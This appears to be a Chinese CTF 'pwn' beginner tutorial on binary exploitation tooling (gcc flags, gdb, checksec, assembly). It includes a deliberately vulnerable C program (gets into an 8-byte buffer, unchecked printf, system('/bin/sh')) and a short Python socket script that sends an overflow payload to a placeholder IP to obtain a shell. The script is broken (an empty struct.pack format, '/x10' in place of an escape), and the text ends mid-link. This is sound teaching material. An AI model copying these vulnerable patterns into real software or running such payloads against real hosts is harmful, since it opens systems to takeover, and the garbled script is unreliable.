---
title: 你想有多PWN
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458588667&idx=2&sn=8bb1c3bb40eb4a3672a3ee009cc78bd2&chksm=b18c257186fbac67ff5da7b4983f664bc67d3d8715fe5ecd3f5f2c4169c5f64ce55101e4d4f6&scene=58&subscene=0#rd
source: 看雪学苑
date: 2025-01-15
fetch_date: 2025-10-06T20:10:47.001990
---

# 你想有多PWN

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqpwbdJBSLPX0maNmag799g46fDFTOGGOeJUBW2NYj28nhGdhnYibLwbA/0?wx_fmt=jpeg)

# 你想有多PWN

stonectf

看雪学苑

✦

**1、打pwn需要准备的武器库**

✦

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqgn4ULfjwsfqxaHEyyibY1uiauXj9D0ZJNGTDqpjhWG2u8RiaIuInOHmoA/640?wx_fmt=png&from=appmsg)

#

✦

**2、副武器**

✦

◆file 程序名：可查看文件类型以及一些大致信息

◆`readelf -a 程序名`：查看elf文件所有节、符号表等信息

◆hexdump 程序名：把指令数据等用十六进制表示出来

◆`ldd 程序名`：可以查看库函数所在库的位置

◆`objdump -d 程序名`：输出反汇编后的汇编指令
（默认是采用att语法格式输出，如果要intel格式可以-M intel）

◆`checksec 程序名`：检查程序开启的保护选项

> 上面的之所以是副武器，因为实际上并不算经常用或者用的不多。

#

#

✦

**3、gcc的基本使用**

✦

##

## 常用编译参数

(1)-o参数：
`gcc xx.c -o 程序名`【直接编译成程序】
可以发现直接编译后所有的保护都已开启：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqIYkL5NUzCsfwN4hevlDUfiaHNergkibxGUu2PJJL1OGoNNp8XEg4eKIA/640?wx_fmt=png&from=appmsg)

(2)-S参数：
`gcc -S xx.c`【编译成汇编代码(注意这里和objdump反汇编出来的还是有点差别的，这个是程序对应的真正的汇编代码)】

两者的区别如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqDgZ2IPkSck1Tmgv5lgC2elciaEvoLebInicwgicDPhPATwIXHAEQKRzZw/640?wx_fmt=png&from=appmsg)

可以发现前者显示结果更加简洁，并且几乎只有汇编指令，也不像后者还有包含.plt等其他elf程序节中的细节信息.

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqWn1A5icK8OU4KQ7jCiaGxzMNaicNEfUJBYaNVgvGjpia9mQKrJPIHLELmg/640?wx_fmt=png&from=appmsg)

(3)-m32参数：

将程序用x86指令集编译成32位程序，但是要注意得提前安装好相应的库：

```
sudo apt-get install gcc-multilib g++-multilib module-assistant
```

(4)-O参数：

关于gcc的-O选项，有对应的等级，默认是1，意思是编译时优化的级别，比如课程中的源码：

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char sh[]="/bin/sh";
int init_func(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    return 0;
}

int func(char *cmd){
    system(cmd);
    return 0;
}

int main(){
    char a[8] = {};
    char b[8] = {};
    //char a[1] = {'b'};
    puts("input:");
    gets(a);
    printf(a);
    if(b[0]=='a'){
        func(sh);
    }
    return 0;
}
```

观察源码会发现这里的if体中不可能执行，因为一开始都没有为b[0]赋值，但是编译时如果采取默认的优化级别，编译器会本着实事求是的原则，既然写了，就让该部分被编译，所以我们最终能实现缓冲区溢出获取shell，但是如果编译时优化级别设置较高，比如`-O3`，那么编译器会认为其不可能执行，所以不将该部分编译，我们就获取不到shell，也就是不可能执行`func(sh)`

(5)-static参数：

gcc加参数`-static`即可静态编译，静态编译后的程序明显比默认用动态编译的程序占用空间大：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqbYibpdfXCqxr2IaopslHQiaQuAviaOerXdduOCfYc1NcXjpKVtibbjOVZA/640?wx_fmt=png&from=appmsg)

发现当检查保护的时候，同样都是默认编译的64位程序，静态程序则默认没有开启PIE：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqna7RMxJc7aFdT6hVtOicicR800SHJ20CUr3p1DkvEgyMHDCy7rKfJvJg/640?wx_fmt=png&from=appmsg)

查看文件时也存在些差异：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqqoNmzXWDtwvE34YRum1Qia5djfW0PkPa5Uz0P3pOibKjqKGkQsDTYIPg/640?wx_fmt=png&from=appmsg)

注意到静态程序是叫`executable`，动态程序是叫`shared object`，发现既有标明静/动态链接，动态链接程序还标出了依赖外部的动态共享库文件`/lib64/ld-linux-x86-64.so.2`，而前者没有，因为静态链接可执行文件已包含了所有必需的库文件,不需要依赖外部的共享库.

而且当查看两者的汇编指令时也能发现：

静态程序是：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqVY4nI46C36DyIzeplaUdBiaspqM3wzXicScYaAWicjZzd4O4GkJJianDCA/640?wx_fmt=png&from=appmsg)

而动态程序是：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzq0g1xbcSwyzOg7lW00Zs45AmWMypInzc2EVaaknNhibdicGRZM7iafqVlw/640?wx_fmt=png&from=appmsg)

发现汇编代码几乎是一样的，只是偏移位置不一样，还有call调用函数时，动态链接程序是`xxx@plt`，即得从plt表中寻找，因为前面提到过动态链接程序要依赖外部共享库.

(6)-fno-omit-frame-pointer参数：
对解题的方法没啥区别，只是汇编指令部分发生了些变化。观察会发现原来基本都是以rbp/ebp为基准来计算、赋值的，加了该参数后，有些地方就可能以rsp/esp为基准。

同样还是以64位程序为例，只加该编译参数。

chatgpt对该参数的解释：

通过使用该选项，编译器将禁用帧指针的省略优化，确保帧指针在编译后的二进制文件中保留，例如，在进行调试或进行栈回溯（stack backtrace）时，帧指针可以提供更好的调试信息，帮助开发人员跟踪函数调用链和定位问题。

(7)-no-pie参数

效果看下面的实验。

✦

**4、主武器gdb**

✦

##

## 修改gdb默认反汇编显示格式

设置默认以intel格式输出反汇编代码：

```
vim ~/.gdbinit
```

最上面加上：

```
set disassembly-flavor intel
```

## 常用指令

`gdb 程序名`【加载程序】
si    【步入】
ni    【步过】
finish    【步出】
start    【开始运行到程序入口点(注意是由gcc内部机制判断出来的，不一定完全准确，所以有些情况需要自己手动判断)】
`i r`【这里是缩写，下文同理，查看当前所有用到的寄存器状态】
`disassemble $rip`【反编译当前rip所在的指令上下文】

### 打印相关：

`p $寄存器`【打印寄存器中存的值(有时候还能用来计算寄存器的偏移地址，比如**p $rbp-0x10**)】
`p &函数名`【打印符号表中存在的某个函数地址】

### 断点相关：

`b *地址`【设置断点】
`i b`【查看所有设置的断点】
`d 断点对应的序号`【删除指定断点(但是在实际运用中，一般不采用删除断点，而是让其失效，万一下次还要用到)】
`disable b 断点对应的序号`【让指定断点失效】
`enable b 断点对应的序号`【让已失效断点重新激活】
c(continue)    【运行到下一个断点为止】

### 内存相关重要指令

#### x指令：

`x/20i 地址或$rip`【以汇编代码格式显示从该地址开始的20条内存单元中的数据】
(下面如果想要数据输出格式为十六进制，可以再加个x,如gx)
`x/20b 地址或$rip`【以每1byte十进制格式显示从该地址开始的20条内存单元中的数据】
`x/20g 地址或$rip`【以每8byte十进制格式显示从该地址开始的20条内存单元中的数据】
`x/20s 地址或$rip`【以字符串格式...】

#### set指令：

`set *地址=值`【将某个地址中的值设置为我们想要的值】

如果要设置寄存器中的值呢？
注意要强制转换一下先，如：
`set *((unsigned int)$ebp)=0x18`

#### vmmap指令：

用于显示当前线程的**内存映射信息**，通过查看内存映射信息，可以了解程序的内存布局，包括代码段、数据段、堆、栈以及共享库等的位置和属性。

# 0x05 汇编指令补充辨析

小背景：由于现在版本的编译器比起以前越来越智能，实际上很多指令在编译器编译时都很少用到了，一般都会做优化处理，而且时代变了，寄存器也不再像从前那样细分若干个并几乎各司其值，很多寄存器实际上编译时也用不到了，除了少部分寄存器几乎只履行自己职责外，如bp和sp类型寄存器一般用于栈操作、ip类型寄存器用于指向当前指令位置，大部分的很多寄存器其实都可以身兼多职。总之，ip类寄存器是老大，最重要的，bp类是老二，sp类是老三，因为内存离不开栈，栈需要bp和sp工作，剩余其他寄存器现在几乎都没啥区别了，也不是特别重要。

## "已忘初心"lea指令

现在的编译器一般不用lea作为载入地址了(但是如果不加方括号的情况下是作为该原用途)，一般用于计算。

比如`lea rax,[rbp-0x18]`【把rbp地址减去0x18后的地址给rax】

那么为什么不用：

```
sub rbp,0x18
mov rax,rbp
```

因为这是编译器为了提高效率优化的方式，它占用的指令长度也更短。而且这种方式还不需要改变rbp的值就可以实现。

## 异或指令xor

一般用于将寄存器的值归零，如`xor eax,eax`

## cmp和sub

两个都是减，只是相减后的结果处理不同，cmp对相减后的结果**不进行赋值存储**，仅用于作判断，和条件跳转指令搭配着用，其实c语言中只要包含cmp的函数都是这个原理。

## test和and

`and eax,eax`

`test eax,eax`->`eax&eax`, eax=0则结果为0；eax!=0则结果为!0

与sub和cmp的区别同理，test和and指令差不多，只是test只用于比较**最后不赋值**，而and赋值。

另外，这里的`test eax,eax`其实就相当于`cmp eax,0`，只是编译器为了优化而选用test而已。

## move带单位PTR

如`move eax,BYTE PTR [rbp-0x10]`，其中PTR代表指针，意思是把[rbp-0x10]地址的值中取1个BYTE即8位给eax寄存器。

常见的单位还有：

```
WORD    DWORD    QWORD
16位    32位      64位
```

#

✦

**6、cpu和寄存器和(虚拟)内存之间的关系**

✦

#

在传递数据时，cpu会**优先从寄存器中取值**，但是寄存器数量有限，如果定义的变量数目远超过寄存器数量，那么多余的变量会先存储在虚拟内存空间中，当需要时再和寄存器做交互传递值。比如上面的[rbp-0x10]就是从虚拟内存地址中找到然后传值的，然后像push就是把暂时用不到的先放到虚拟内存中。

#

✦

**7、pwn题常见函数**

✦

#

## strcmp

这个函数常用于做字符串比较，实际看反汇编代码过程中其实当成cmp去识别就好了。

✦

**8、pwn题远程部署**

✦

常用的部署命令：

```
socat tcp-l:端口,fork exec:./程序名,reuseaddr
```

#

✦

**9、用python脚本打pwn的原因**

✦

因为有些时候比如题目中的比较字符是一个**不可打印字符**，如0x10，虽然我们在gdb调试中可以试着将虚拟内存中对应的数据改成0x10从而getshell，但是在shell中运行程序时是输入不了像0x10这样的不可打印字符的，如果我们输入它，会被当成字符串，也就是会把0x10拆分着看，而不是将其当作一个整体，所以这时候要用到python脚本中已有的模块来实现。

## 打pwn简单python脚本模板

```
import socket
import telnetlib
import struct

def P32(val):
  return struct.pack("", val)

def pwn():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("xxx.xxx.xxx.xxx", 7777))
  payload = 'A'*8 + '/x10'
  s.sendall(payload + 'n')
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

if __name__ == "__main__":
  pwn()

//该脚本实际上就是模拟我们nc连接远程服务器，然后输入8个A拼接上不可见字符0x10来getshell而已。并且当然实际上常用的不是这么写的，会用到pwntools等模块，比上面的简洁方便很多
```

✦

**10、简单缓冲区溢出入门小实验**

✦

##

## 实验前提！！！

gcc版本都是在9.3~9.4的，并且在ubuntu20.04环境编译，部分题要在其他系统利用记得要带上相应的动态链接库.so文件。

## 比较单字符型缓冲区溢出

demo位置：`/chapter_1/test_1/question_1_x64`

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
//默认编译参数, x64程序
char sh[]="/bin/sh";
int init_func(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    return 0;
}

int func(char *cmd){
        system(cmd);
        return 0;
}

int main(){
    char a[8] = {};
    char b[8] = {};
    //char a[1] = {'b'};
        puts("input:");
        gets(a);
        printf(a);
        if(b[0]=='a'){
                func(sh);
        }
    return 0;
}
```

简单代码审计分析：

```
刚开始定义的init_func()实际上就是定义一些文件流缓冲区相关的模式，初始化程序的输入输出流，使得输入和输出可以立即生效，而不需要等待缓冲区条件满足，简单了解就行不重要；下面主要就是分别定义两个数组，其中获取到的用户输入传给a，然后比较b[0]是否和用户输入相等，相等则执行func函数即获得一个shell，但注意实际上这里的b数组没有被初始化，所以理论上来看实际上永远不会被执行，但是如果编译选项为-O高等级，那么就会自动被忽略编译该部分，因此就无法成功利用缓冲区溢出。这里能够缓冲区溢出主要是因为用`gets`来获取用户输入，这个函数不安全，无法检查输入缓冲区的大小，理论上可以输入无数个字符，直到我们按回车，即转义成换行符/n被程序识别到为止，所以存在缓冲区溢出的风险，溢出的即多余该a[8]的那部分会跑到b[8]中从而覆盖，因此从攻击者角度而言，可使这部分操作是可控的，比如这时溢出的值是'a'且刚好在b[0]位置，从而就拿到shell了。接下来就可以利用gdb动态调试下去分析里面的细节来验证是否可利用，毕竟俗话说"遇事不决，动态调试^-^"
```

我们刚拿到程序时首先要直到它都做了啥，所以第一步先运行程序：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HvKo7aEEmfwG8NxWDCiamzqPHwdibKuMOqgS5SX1BYvHM85LfuBtLR...